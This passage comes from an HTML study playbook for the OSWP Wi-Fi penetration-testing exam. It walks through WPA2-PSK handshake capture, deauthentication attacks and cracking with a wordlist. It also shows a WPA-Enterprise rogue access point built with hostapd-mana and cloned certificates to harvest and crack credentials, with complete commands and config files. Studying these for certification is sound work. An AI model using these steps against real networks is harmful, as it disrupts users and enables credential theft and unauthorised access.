src="image%2011.png"/></a></figure><ul id="175e0b5d-831e-81fa-8b8b-c5a4719cf72d" class="bulleted-list"><li style="list-style-type:disc"><code>ifconfig</code></li></ul><figure id="175e0b5d-831e-81dc-b37a-cd220def004d" class="image" style="text-align:left"><a href="image%2012.png"><img style="width:768px" src="image%2012.png"/></a></figure><ul id="175e0b5d-831e-8105-8653-c6befc17996e" class="bulleted-list"><li style="list-style-type:disc"><code>iwconfig</code></li></ul><figure id="175e0b5d-831e-81c3-a0f5-d2841e586b1b" class="image" style="text-align:left"><a href="image%2013.png"><img style="width:768px" src="image%2013.png"/></a></figure><ul id="175e0b5d-831e-808b-ac47-f6572779a282" class="bulleted-list"><li style="list-style-type:disc">Collecting details of the target network such as the channel and BSSID.</li></ul><ul id="175e0b5d-831e-8153-9e86-ca68c3242dce" class="bulleted-list"><li style="list-style-type:disc"><code>airodump-ng </code><mark class="highlight-yellow"><code><strong>wlan0mon</strong></code></mark></li></ul><figure id="175e0b5d-831e-8178-9c7a-e8657e60d161" class="image" style="text-align:left"><a href="image%2014.png"><img style="width:768px" src="image%2014.png"/></a></figure><ul id="175e0b5d-831e-8077-a2e1-ecbdd4d417bc" class="bulleted-list"><li style="list-style-type:disc">Intercept the handshake.</li></ul><ul id="175e0b5d-831e-81a5-94d1-d8d68770d49a" class="bulleted-list"><li style="list-style-type:disc"><code>airodump-ng -c </code><mark class="highlight-yellow"><code><strong>6</strong></code></mark><code> --bssid </code><mark class="highlight-yellow"><code><strong>F0:9F:C2:71:22:12</strong></code></mark><code> -w </code><mark class="highlight-yellow"><code><strong>wifi-mobile</strong></code></mark><code> wlan0mon</code> </li></ul><figure id="175e0b5d-831e-8188-9202-e72825c1904a" class="image" style="text-align:left"><a href="image%2015.png"><img style="width:768px" src="image%2015.png"/></a></figure><ul id="175e0b5d-831e-809e-9f1c-ce2413e43d4d" class="bulleted-list"><li style="list-style-type:disc">Execute a de-authentication attack to disconnect a specific client and capture the handshake.</li></ul><ul id="175e0b5d-831e-8123-b252-e21ac66ce2a5" class="bulleted-list"><li style="list-style-type:disc"><code>sudo aireplay-ng -a </code><mark class="highlight-yellow"><code><strong>F0:9F:C2:71:22:12</strong></code></mark><code> --deauth </code><mark class="highlight-yellow"><code>100 </code></mark><code>wlan0mon</code></li></ul><p id="175e0b5d-831e-81b9-a8fe-dcaefa646be9" class="">                                                              OR</p><ul id="175e0b5d-831e-815d-9261-dc7c79233bed" class="bulleted-list"><li style="list-style-type:disc"><code>aireplay-ng -0 </code><mark class="highlight-yellow"><code>12</code></mark><code> -a </code><mark class="highlight-yellow"><code><strong>F0:9F:C2:71:22:12</strong></code></mark><code> -c </code><mark class="highlight-yellow"><code><strong>28:6C:07:6F:F9:44</strong></code></mark><code> wlan0mon</code></li></ul><figure id="175e0b5d-831e-8160-9302-dab13772a760" class="image" style="text-align:left"><a href="image%2016.png"><img style="width:768px" src="image%2016.png"/></a></figure><ul id="175e0b5d-831e-80b1-bf83-d757ce8530bc" class="bulleted-list"><li style="list-style-type:disc">Wait for the handshake to be obtained.</li></ul><ul id="175e0b5d-831e-8085-8efe-c7010fb19a4b" class="bulleted-list"><li style="list-style-type:disc">The handshake will be completed after the de-authentication.</li></ul><figure id="175e0b5d-831e-81bc-b967-d0f8b5b1ceb1" class="image" style="text-align:left"><a href="image%2017.png"><img style="width:768px" src="image%2017.png"/></a></figure><ul id="175e0b5d-831e-80d1-952c-c41a08e83a07" class="bulleted-list"><li style="list-style-type:disc">Next, transfer the file to your Kali machine.</li></ul><figure id="175e0b5d-831e-8104-afd8-e61585ebd443" class="image" style="text-align:left"><a href="image%2018.png"><img style="width:768px" src="image%2018.png"/></a></figure><figure id="175e0b5d-831e-81fd-87a9-d81cdcd33e95" class="image" style="text-align:left"><a href="image%2019.png"><img style="width:432px" src="image%2019.png"/></a></figure><ul id="175e0b5d-831e-802d-be90-e3afb6f49566" class="bulleted-list"><li style="list-style-type:disc">After obtaining the EAPOL handshake, we will crack the password with aircrack-ng.</li></ul><ul id="175e0b5d-831e-8149-ae0e-c1f3a826e462" class="bulleted-list"><li style="list-style-type:disc"><code>aircrack-ng </code><mark class="highlight-yellow"><code><strong>wifi-mobile-01.cap</strong></code></mark><code> -w /usr/share/wordlists/</code><mark class="highlight-yellow"><code><strong>rockyou.txt</strong></code></mark></li></ul><figure id="175e0b5d-831e-81af-8f17-fa85f4ef0b26" class="image" style="text-align:left"><a href="image%2020.png"><img style="width:624px" src="image%2020.png"/></a></figure><figure id="175e0b5d-831e-81b5-8d34-fae0adcda137" class="image" style="text-align:left"><a href="image%2021.png"><img style="width:624px" src="image%2021.png"/></a></figure><ul id="175e0b5d-831e-81ff-8458-c527700b8eb9" class="bulleted-list"><li style="list-style-type:disc"><a href="https://r4ulcl.com/posts/top-10-wi-fi-hacking-tips/#psk-wpa2">https://r4ulcl.com/posts/top-10-wi-fi-hacking-tips/#psk-wpa2</a></li></ul><ul id="175e0b5d-831e-80b2-af28-dc742ac64cd2" class="bulleted-list"><li style="list-style-type:disc">Follow the &quot;Connecting to Networks&quot; section to connect to the network.</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="175e0b5d-831e-810b-8701-c0a97e158113" class="code"><code class="language-JavaScript">network={
+    ssid=&quot;SWCC&quot;
+    psk=&quot;chameleon&quot;
+    scan_ssid=1
+    key_mgmt=WPA-PSK
+    proto=WPA2
+}</code></pre><ul id="175e0b5d-831e-81b9-8ef3-e3de13b02639" class="bulleted-list"><li style="list-style-type:disc"><code>mousepad </code><mark class="highlight-yellow"><code><strong>wpa2.conf</strong></code></mark></li></ul><figure id="175e0b5d-831e-81ec-a41f-c0e810b065be" class="image" style="text-align:left"><a href="image%2022.png"><img style="width:336px" src="image%2022.png"/></a></figure><ul id="175e0b5d-831e-8026-ba5a-f72035c405d4" class="bulleted-list"><li style="list-style-type:disc">Transfer the file to the user&#x27;s system now.</li></ul><figure id="175e0b5d-831e-8173-9a67-dd454bfe9df9" class="image" style="text-align:left"><a href="image%2023.png"><img style="width:720px" src="image%2023.png"/></a></figure><figure id="175e0b5d-831e-8144-9df7-c8d0126993d9" class="image" style="text-align:left"><a href="image%2024.png"><img style="width:768px" src="image%2024.png"/></a></figure><ul id="175e0b5d-831e-8078-86f2-dc3346b2d4c1" class="bulleted-list"><li style="list-style-type:disc">Switch the interface back to managed mode.</li></ul><ul id="175e0b5d-831e-8159-804f-d461153e45a9" class="bulleted-list"><li style="list-style-type:disc"><code>airmon-ng </code><mark class="highlight-yellow"><code><strong>stop</strong></code></mark><code> wlan0mon</code></li></ul><figure id="175e0b5d-831e-8149-a4fd-efd32febbbf2" class="image" style="text-align:left"><a href="image%2025.png"><img style="width:768px" src="image%2025.png"/></a></figure><ul id="175e0b5d-831e-81ed-bbbd-c0d12b0f5a19" class="bulleted-list"><li style="list-style-type:disc"><code>wpa_supplicant -i </code><mark class="highlight-yellow"><code><strong>wlan0</strong></code></mark><code> -c </code><mark class="highlight-yellow"><code><strong>wpa2.conf</strong></code></mark> </li></ul><figure id="175e0b5d-831e-813f-9bce-c3402c962b66" class="image" style="text-align:left"><a href="image%2026.png"><img style="width:768px" src="image%2026.png"/></a></figure><ul id="175e0b5d-831e-818e-999f-d8bc56fce98e" class="bulleted-list"><li style="list-style-type:disc"><code>dhclient wlan0 -v</code></li></ul><figure id="175e0b5d-831e-8163-b52e-d570500b32be" class="image" style="text-align:left"><a href="image%2027.png"><img style="width:768px" src="image%2027.png"/></a></figure><ul id="175e0b5d-831e-80bf-95c3-c053b1634e25" class="bulleted-list"><li style="list-style-type:disc">If proof.txt exists, we can access it.</li></ul><ul id="175e0b5d-831e-8063-81af-e38d4496ee9f" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-red"><strong>Note</strong></mark>: You will have access to proof.txt in the exam.</li></ul><ul id="175e0b5d-831e-81c5-b008-cb11a44de1cf" class="bulleted-list"><li style="list-style-type:disc"><code>curl http://</code><mark class="highlight-yellow"><code><strong>192.168.2.1</strong></code></mark><code>/</code><mark class="highlight-yellow"><code><strong>proof.txt</strong></code></mark></li></ul><figure id="175e0b5d-831e-81cc-8707-c610667b18ac" class="image" style="text-align:left"><a href="image%2028.png"><img style="width:768px" src="image%2028.png"/></a></figure></div></details><hr id="175e0b5d-831e-81e0-adbe-ee9d04ee1dea"/><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><mark class="highlight-purple"><strong> WPA-Enterprise (MGT)</strong></mark></summary><div class="indented"><p id="175e0b5d-831e-8180-83d5-f8512c60d96b" class=""><a href="https://portal.offsec.com/courses/pen-210-9545/learning/attacking-wpa-enterprise-15796/attack-15825/attack-16070">https://portal.offsec.com/courses/pen-210-9545/learning/attacking-wpa-enterprise-15796/attack-15825/attack-16070</a></p><ul id="175e0b5d-831e-8128-983d-c6c19dc87faf" class="bulleted-list"><li style="list-style-type:disc"><code>airmon-ng check </code><mark class="highlight-yellow"><code><strong>kill</strong></code></mark></li></ul><ul id="175e0b5d-831e-819c-9b2e-e999ce0595b6" class="bulleted-list"><li style="list-style-type:disc"><code>airmon-ng start </code><mark class="highlight-yellow"><code><strong>wlan0</strong></code></mark><mark class="highlight-yellow"><strong> </strong></mark></li></ul><figure id="175e0b5d-831e-811e-9d01-edc7b80a9af2" class="image" style="text-align:left"><a href="image%2029.png"><img style="width:720px" src="image%2029.png"/></a></figure><ul id="175e0b5d-831e-8079-9869-c7d2a1409900" class="bulleted-list"><li style="list-style-type:disc">Initially, we gather information like BSSID and channel to filter the networks by</li></ul><ul id="175e0b5d-831e-81e8-9b25-d7cd7a882c48" class="bulleted-list"><li style="list-style-type:disc"><code>airodump-ng wlan0mon </code><mark class="highlight-yellow"><code><strong>--band abg</strong></code></mark></li></ul><figure id="175e0b5d-831e-81d9-bd71-c6c72263532e" class="image" style="text-align:left"><a href="image%2030.png"><img style="width:720px" src="image%2030.png"/></a></figure><ul id="175e0b5d-831e-80d0-8e53-e488911ec350" class="bulleted-list"><li style="list-style-type:disc">Next, we capture the handshake for the enterprise network.</li></ul><ul id="175e0b5d-831e-8156-802d-feb7e861d32c" class="bulleted-list"><li style="list-style-type:disc"><code>airodump-ng --band abg -c </code><mark class="highlight-yellow"><code><strong>44</strong></code></mark><code> --bssid </code><mark class="highlight-yellow"><code><strong>F0:9F:C2:71:22:15</strong></code></mark><code> -w </code><mark class="highlight-yellow"><code>wifi-corp</code></mark><code> wlan0mon</code></li></ul><figure id="175e0b5d-831e-817b-bf42-ff165bce5924" class="image" style="text-align:left"><a href="image%2031.png"><img style="width:720px" src="image%2031.png"/></a></figure><ul id="175e0b5d-831e-8000-8687-cb66e1e1e092" class="bulleted-list"><li style="list-style-type:disc">Send a forged authentication request.</li></ul><ul id="175e0b5d-831e-81f1-90dc-f43bfd9dea48" class="bulleted-list"><li style="list-style-type:disc"><code>sudo aireplay-ng -0 4 -a </code><mark class="highlight-yellow"><code><strong>&lt;BSSID&gt;</strong></code></mark><code> wlan0mon</code></li></ul><p id="175e0b5d-831e-813f-9462-f9f0fb0ac422" class="">                                                OR</p><ul id="175e0b5d-831e-8175-bded-da9af32a9bc5" class="bulleted-list"><li style="list-style-type:disc"><code>sudo aireplay-ng -a </code><mark class="highlight-yellow"><code><strong>F0:9F:C2:71:22:12</strong></code></mark><code> --deauth </code><mark class="highlight-yellow"><code>100 </code></mark><code>wlan0mon</code></li></ul><p id="175e0b5d-831e-81f3-abdf-e8a19338afcd" class="">                                                OR</p><ul id="175e0b5d-831e-8153-9c5c-fe598aa78d6d" class="bulleted-list"><li style="list-style-type:disc"><code>aireplay-ng -0 </code><mark class="highlight-yellow"><code>12</code></mark><code> -a </code><mark class="highlight-yellow"><code><strong>F0:9F:C2:71:22:12</strong></code></mark><code> -c </code><mark class="highlight-yellow"><code><strong>28:6C:07:6F:F9:44</strong></code></mark><code> wlan0mon</code> </li></ul><ul id="175e0b5d-831e-81cd-b8b7-f8a9d2f81646" class="bulleted-list"><li style="list-style-type:disc">Then, move the file to your Kali machine.</li></ul><figure id="175e0b5d-831e-81ef-a532-f218d8435008" class="image" style="text-align:left"><a href="image%2032.png"><img style="width:768px" src="image%2032.png"/></a></figure><ul id="175e0b5d-831e-8060-b8e2-e415f675d569" class="bulleted-list"><li style="list-style-type:disc">After capturing network traffic, we can analyze it using Wireshark.</li></ul><ul id="175e0b5d-831e-81b4-a469-ec95f87c53ca" class="bulleted-list"><li style="list-style-type:disc"><code>wireshark </code><mark class="highlight-yellow"><code><strong>wifi-corp-01.cap</strong></code></mark><mark class="highlight-yellow"><strong> </strong></mark></li></ul><ul id="175e0b5d-831e-80b7-b128-e68cf5374772" class="bulleted-list"><li style="list-style-type:disc">Extract the certificate from the traffic.</li></ul><ul id="175e0b5d-831e-815d-a50f-c91eb7dc4a64" class="bulleted-list"><li style="list-style-type:disc"><code><strong>tls.handshake.type == 11</strong></code><strong> </strong>or <code><strong>tls.handshake.certificate</strong></code><strong> </strong></li></ul><figure id="175e0b5d-831e-811c-a3ac-dcbe176b455f" class="image" style="text-align:left"><a href="image%2033.png"><img style="width:768px" src="image%2033.png"/></a></figure><ul id="175e0b5d-831e-80d0-a93b-c42ce819cad2" class="bulleted-list"><li style="list-style-type:disc">Export the file as <code>cert.der</code></li></ul><ul id="175e0b5d-831e-8031-aca1-c1d50d9ed98d" class="bulleted-list"><li style="list-style-type:disc">This command allows us to show the certificate details as well.</li></ul><ul id="175e0b5d-831e-8181-b8ff-ecd5f2a91728" class="bulleted-list"><li style="list-style-type:disc"><code>openssl x509 -inform der -in </code><mark class="highlight-yellow"><code><strong>cert.der</strong></code></mark><code> -text</code></li></ul><figure id="175e0b5d-831e-81b8-a15d-fdff1bcf2bbe" class="image" style="text-align:left"><a href="image%2034.png"><img style="width:768px" src="image%2034.png"/></a></figure><ul id="175e0b5d-831e-8034-886d-ded6fcb222f8" class="bulleted-list"><li style="list-style-type:disc">Create a fake network using FreeRADIUS.</li></ul><ul id="175e0b5d-831e-804b-9cda-c906b16ef712" class="bulleted-list"><li style="list-style-type:disc">Navigate to the /etc/freeradius/3.0/certs directory, then update the following two files with the information extracted from the certificate:</li></ul><ul id="175e0b5d-831e-8115-a4d5-d66da800c95f" class="bulleted-list"><li style="list-style-type:disc"><code>cd /etc/freeradius/3.0/certs</code></li></ul><figure id="175e0b5d-831e-805e-b21e-c859a02af411" class="image"><a href="image%2035.png"><img style="width:912px" src="image%2035.png"/></a></figure><ul id="175e0b5d-831e-806f-930e-d77aebf8c045" class="bulleted-list"><li style="list-style-type:disc">Copy the information from the red-marked area and insert it into <code>ca.cnf</code> and <code>server.cnf</code></li></ul><ul id="175e0b5d-831e-814e-9c7a-d9175f6a14a0" class="bulleted-list"><li style="list-style-type:disc"><code>nano </code><mark class="highlight-yellow"><code><strong>ca.cnf</strong></code></mark></li></ul><ul id="175e0b5d-831e-8151-8291-cbf6635589c3" class="bulleted-list"><li style="list-style-type:disc"><code>nano </code><mark class="highlight-yellow"><code><strong>server.cnf</strong></code></mark></li></ul><figure id="175e0b5d-831e-818b-a320-ebf52323a958" class="image" style="text-align:left"><a href="image%2036.png"><img style="width:960px" src="image%2036.png"/></a></figure><ul id="175e0b5d-831e-80cb-8185-ec1fc1563d4c" class="bulleted-list"><li style="list-style-type:disc">Next, execute the following commands under /etc/freeradius/3.0/certs to create the Diffie-Hellman key for hostapd-mana.</li></ul><ul id="175e0b5d-831e-81c7-bbae-cafe9b8487d9" class="bulleted-list"><li style="list-style-type:disc"><code>rm dh</code></li></ul><ul id="175e0b5d-831e-810e-b3eb-d9ff1acd5ac8" class="bulleted-list"><li style="list-style-type:disc"><code>make</code></li></ul><figure id="175e0b5d-831e-81e1-af65-fe527478323b" class="image" style="text-align:left"><a href="image%2037.png"><img style="width:816px" src="image%2037.png"/></a></figure><ul id="175e0b5d-831e-802d-a502-f5a966b6e64f" class="bulleted-list"><li style="list-style-type:disc">The EAP user file, mana.eap_user, is created.</li></ul><ul id="175e0b5d-831e-81cd-b471-f64caca37d38" class="bulleted-list"><li style="list-style-type:disc"><code>touch </code><mark class="highlight-yellow"><code><strong>mana.eap_user</strong></code></mark></li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="175e0b5d-831e-819f-9efe-c9f68b0532fa" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">*	PEAP,TTLS,TLS,FAST
+&quot;t&quot;   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    &quot;pass&quot;   [2]</code></pre><figure id="175e0b5d-831e-812b-98f5-eb39f21296b8" class="image" style="text-align:left"><a href="image%2038.png"><img style="width:864px" src="image%2038.png"/></a></figure><ul id="175e0b5d-831e-807f-acae-c85ca3cb0470" class="bulleted-list"><li style="list-style-type:disc">Next, we create a fake access point by making a file called network.conf in any directory.</li></ul><ul id="175e0b5d-831e-81f0-a64a-ce9f264f3aa8" class="bulleted-list"><li style="list-style-type:disc"><code>touch </code><mark class="highlight-yellow"><code><strong>net.conf</strong></code></mark></li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="175e0b5d-831e-8179-8cbb-fff1de562730" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">ssid=&lt;ESSID&gt;
+interface=&lt;managed_mode_interface&gt;
+driver=nl80211
+
+channel=&lt;channel&gt;
+hw_mode=a
+ieee8021x=1
+eap_server=1
+eapol_key_index_workaround=0
+
+eap_user_file=/home/user/mana.eap_user
+
+ca_cert=/etc/freeradius/3.0/certs/ca.pem
+server_cert=/etc/freeradius/3.0/certs/server.pem
+private_key=/etc/freeradius/3.0/certs/server.key
+
+private_key_passwd=whatever
+
+dh_file=/etc/freeradius/3.0/certs/dh
+
+
+auth_algs=1
+wpa=3
+wpa_key_mgmt=WPA-EAP
+
+
+wpa_pairwise=CCMP TKIP
+mana_wpe=1
+mana_credout=/home/user/Desktop/hostapd.credoutfile
+mana_eapsuccess=1
+mana_eaptls=1</code></pre><ul id="175e0b5d-831e-8106-ade6-d6b3dba4f207" class="bulleted-list"><li style="list-style-type:disc">Switch the interface back to managed mode.</li></ul><ul id="175e0b5d-831e-81f9-952e-dfbb760afb42" class="bulleted-list"><li style="list-style-type:disc"><code>sudo airmon-ng stop </code><mark class="highlight-yellow"><code>wlan0mon</code></mark><mark class="highlight-yellow"> </mark></li></ul><ul id="175e0b5d-831e-8128-9486-e98dc53145cd" class="bulleted-list"><li style="list-style-type:disc"><code>sudo iwconfig </code><mark class="highlight-yellow"><code>wlan0 </code></mark><code>mode </code><mark class="highlight-yellow"><code>managed</code></mark></li></ul><ul id="175e0b5d-831e-81e5-b2fe-dff814025b7d" class="bulleted-list"><li style="list-style-type:disc"><code>sudo hostapd-mana </code><mark class="highlight-yellow"><code><strong>net.conf</strong></code></mark></li></ul><p id="175e0b5d-831e-81db-9129-eb9a283da6db" class="">De-authentication attack</p><p id="175e0b5d-831e-8128-94b5-c257cc2e65ac" class="">→ <mark class="highlight-yellow"><strong>Perform De-authentication attack </strong></mark>→ <mark class="highlight-yellow"><strong>Using another interface</strong></mark></p><ul id="175e0b5d-831e-8181-869b-c78bf13ca483" class="bulleted-list"><li style="list-style-type:disc"><code>sudo  iwconfig </code><mark class="highlight-yellow"><code><strong>wlan1</strong></code></mark><code> channel </code><mark class="highlight-yellow"><code>44</code></mark></li></ul><ul id="175e0b5d-831e-81ed-87ef-e170e815cc37" class="bulleted-list"><li style="list-style-type:disc"><code>sudo aireplay-ng -0 0 -a </code><mark class="highlight-yellow"><code><strong>F0:9F:C2:71:22:1A</strong></code></mark><code> </code><mark class="highlight-yellow"><code><strong>wlan1</strong></code></mark></li></ul><p id="175e0b5d-831e-8043-84da-c0c8680ea824" class="">                                                  OR</p><ul id="175e0b5d-831e-81af-addc-ebd08b2030c0" class="bulleted-list"><li style="list-style-type:disc"><code>sudo aireplay-ng -0 0 -a </code><mark class="highlight-yellow"><code><strong>F0:9F:C2:71:22:15</strong></code></mark><code> -h </code><mark class="highlight-yellow"><code><strong>F0:9F:C2:71:22:1A</strong></code></mark><code> -c </code><mark class="highlight-yellow"><code><strong>64:32:A8:07:6C:40</strong></code></mark><code> </code><mark class="highlight-yellow"><code><strong>wlan1</strong></code></mark></li></ul><p id="175e0b5d-831e-81c5-a020-d12655a83f06" class="">                                                  OR</p><ul id="175e0b5d-831e-81ef-b7f2-c611134d6c3c" class="bulleted-list"><li style="list-style-type:disc"><code>sudo aireplay-ng -a </code><mark class="highlight-yellow"><code><strong>F0:9F:C2:71:22:15</strong></code></mark><code>  --deauth 100 wlan0</code></li></ul><p id="175e0b5d-831e-8123-9cc1-ed54b26e7f77" class="">                                                 OR</p><ul id="175e0b5d-831e-815c-aff8-d1e662553970" class="bulleted-list"><li style="list-style-type:disc"><code>sudo aireplay-ng -c </code><mark class="highlight-yellow"><code>F0:9F:C2:71:22:15  </code></mark><code>-a </code><mark class="highlight-yellow"><code>F0:9F:C2:71:22:15 </code></mark><code> --deauth 100 </code><mark class="highlight-yellow"><code>wlan0</code></mark></li></ul><ul id="175e0b5d-831e-80e3-b3c3-d74b9bf8c99d" class="bulleted-list"><li style="list-style-type:disc">After obtaining the handshake, continue.</li></ul><ul id="175e0b5d-831e-80ed-9e34-fae7703b7b40" class="bulleted-list"><li style="list-style-type:disc"><code>sudo hostapd-mana </code><mark class="highlight-yellow"><code>net.conf</code></mark></li></ul><figure id="175e0b5d-831e-810e-88a1-d4840ab01577" class="image" style="text-align:left"><a href="image%2039.png"><img style="width:816px" src="image%2039.png"/></a></figure><ul id="175e0b5d-831e-8049-b019-d1ef991bf2b7" class="bulleted-list"><li style="list-style-type:disc">Put the hash in a file called fileusing the Hashcat tool, then run this command to crack it.</li></ul><ul id="175e0b5d-831e-81d1-83c5-d8e247ed0607" class="bulleted-list"><li style="list-style-type:disc"><code>john --wordlist=/usr/share/wordlists/rockyou.txt </code><mark class="highlight-yellow"><code><strong>file</strong></code></mark></li></ul><figure id="175e0b5d-831e-81c0-8a05-e54ec601aa26" class="image" style="text-align:left"><a href="image%2040.png"><img style="width:816px" src="image%2040.png"/></a></figure><ul id="175e0b5d-831e-81b4-b3aa-d2b9ddc572e5" class="bulleted-list"><li style="list-style-type:disc"><code>nano </code><mark class="highlight-yellow"><code><strong>wpa_supplicant.conf</strong></code></mark><mark class="highlight-yellow"><strong> </strong></mark></li></ul><p id="175e0b5d-831e-800b-873d-e1469acfa8dd" class=""><a href="https://r4ulcl.com/posts/top-10-wi-fi-hacking-tips/#mgt-wpa2wpa3">https://r4ulcl.com/posts/top-10-wi-fi-hacking-tips/#mgt-wpa2wpa3</a></p><p id="175e0b5d-831e-815e-adc2-f4b841e4705b" class="">Add This</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="175e0b5d-831e-81f2-a303-d10bf07f898d" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">network={
+    ssid=&quot;HSoWaW&quot;
+    scan_ssid=1
+    key_mgmt=WPA-EAP
+    eap=PEAP
+    #anonymous_identity=&quot;DOMAIN\anonymous&quot;
+    identity=&quot;Hogwarts\rweasly&quot;
+    password=&quot;skywalker&quot;
+    phase1=&quot;peapver=1&quot;
+    #ca_cert=&quot;/root/certs/ca.crt&quot;
+    #ieee80211w=0
+    phase2=&quot;auth=MSCHAPV2&quot;
+}</code></pre><p id="175e0b5d-831e-8115-be63-d7e1a197077c" class="">Another Terma</p><ul id="175e0b5d-831e-8115-b164-d9171f281bd0" class="bulleted-list"><li style="list-style-type:disc"><code>airmon-ng stop </code><mark class="highlight-yellow"><code>wlan0</code></mark></li></ul><ul id="175e0b5d-831e-8132-bb83-f8a437f27d5d" class="bulleted-list"><li style="list-style-type:disc"><code>wpa_supplicant -i wlan0 -c </code><mark class="highlight-yellow"><code><strong>wpa_supplicant.conf</strong></code></mark><mark class="highlight-yellow"><strong> </strong></mark></li></ul><ul id="175e0b5d-831e-8194-b1e4-c9aafdae9e63" class="bulleted-list"><li style="list-style-type:disc"><code>wpa_supplicant -B -i wlan0 -c </code><mark class="highlight-yellow"><code><strong>wpa_supplicant.conf</strong></code></mark></li></ul><figure id="175e0b5d-831e-8122-b6e2-ef2c2aba913a" class="image" style="text-align:left"><a href="image%2041.png"><img style="width:816px" src="image%2041.png"/></a></figure><ul id="175e0b5d-831e-811d-9bff-f5fdc34a0b86" class="bulleted-list"><li style="list-style-type:disc"><code>dhclient wlan0 -v</code></li></ul><figure id="175e0b5d-831e-8164-a1d5-c8fc1faa5dab" class="image" style="text-align:left"><a href="image%2042.png"><img style="width:816px" src="image%2042.png"/></a></figure><ul id="175e0b5d-831e-80f2-8e47-e2be8194c58a" class="bulleted-list"><li style="list-style-type:disc">If proof.txt exists, we can access it.</li></ul><ul id="175e0b5d-831e-8027-90f8-daaea8469a08" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-red"><strong>Note</strong></mark>: You will have access to proof.txt in the exam.</li></ul><ul id="175e0b5d-831e-81ec-95ca-cb2cc5a1bd03" class="bulleted-list"><li style="list-style-type:disc"><code>curl http://</code><mark class="highlight-yellow"><code><strong>192.168.5.1</strong></code></mark><code>/</code><mark class="highlight-yellow"><code><strong>proof.txt</strong></code></mark></li></ul><figure id="175e0b5d-831e-8125-a191-e81a907b5c47" class="image" style="text-align:left"><a href="image%2043.png"><img style="width:816px" src="image%2043.png"/></a></figure></div></details><hr id="175e0b5d-831e-8074-8a94-deb464a3984d"/><p id="175e0b5d-831e-8107-bfe6-ee0255a1bf3e" class="">
+</p><p id="175e0b5d-831e-808b-af10-d9455924855f" class=""><strong>                                Thank you for viewing my OSWP Playbook.</strong></p><p id="175e0b5d-831e-80e9-a10e-f959f6f3a95b" class="">
+</p><hr id="175e0b5d-831e-80df-9c95-ed4a3fd3712c"/><p id="175e0b5d-831e-808e-8e13-feaa7d015d50" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
